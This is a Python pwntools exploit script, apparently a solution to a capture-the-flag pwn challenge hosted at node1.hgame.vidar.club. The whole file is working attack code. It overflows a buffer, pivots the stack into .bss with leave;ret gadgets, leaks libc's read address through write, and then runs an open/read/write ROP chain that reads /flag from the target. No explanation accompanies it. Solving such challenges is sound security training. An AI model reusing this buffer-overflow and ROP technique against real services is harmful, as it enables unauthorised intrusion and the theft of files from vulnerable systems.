from pwn import *

context.log_level='debug'
r=remote("node1.hgame.vidar.club",30837)
#r=remote("127.0.0.1",9999)
r.recvuntil(b"Good luck.")
bss_add=0x404800
read_add_0=0x4013D9
read_add=0x401420
r.send(b"a"*0x50+p64(bss_add)+p64(read_add_0))
rdi_add=0x401713
rsir15_add=0x401711
read_got=0x404068
bss_2=0x404900
write_plt=0x401190
learet_add=0x4013cb
r.recvuntil(b"Good luck.\n")
r.send(p64(bss_2)+p64(rsir15_add)+p64(read_got)+p64(0)+p64(write_plt)+p64(rsir15_add)+p64(bss_2)+p64(0)+p64(read_add)+p64(learet_add)+p64(bss_add-0x50)+p64(learet_add))

libc_read=u64(r.recv(6).ljust(8,b"\x00"))
print(hex(libc_read))
r.recv()
bss_3=0x404a00
libc=ELF("./libc-2.31.so")
libc_base=libc_read-libc.sym["read"]     
open_add=libc.sym["open"]+libc_base
read_add=libc_read
write_add=libc.sym["write"]+libc_base
rdxr12_add=0x119431+libc_base
#movraxrdi_add=0x5b521+libc_base
rax_add=0x36174+libc_base
syscall_add=0x630a9+libc_base
print(hex(libc_base))
pause()
r.send(p64(bss_3)+p64(rsir15_add)+p64(bss_3)+p64(0)+p64(rdxr12_add)+p64(0x100)+p64(0)+p64(read_add)+p64(learet_add)+p64(0)*3)
pause()
r.send(b"/flag\x00\x00\x00"+p64(rdi_add)+p64(bss_3)+p64(rsir15_add)+p64(0)+p64(0)+p64(rdxr12_add)+p64(0)+p64(0)+p64(rax_add)+p64(2)+p64(syscall_add)+p64(rdi_add)+p64(5)+p64(rsir15_add)+p64(bss_3+0x200)+p64(0)+p64(rdxr12_add)+p64(0x50)+p64(0)+p64(read_add)+p64(rdi_add)+p64(4)+p64(write_add))


r.interactive()
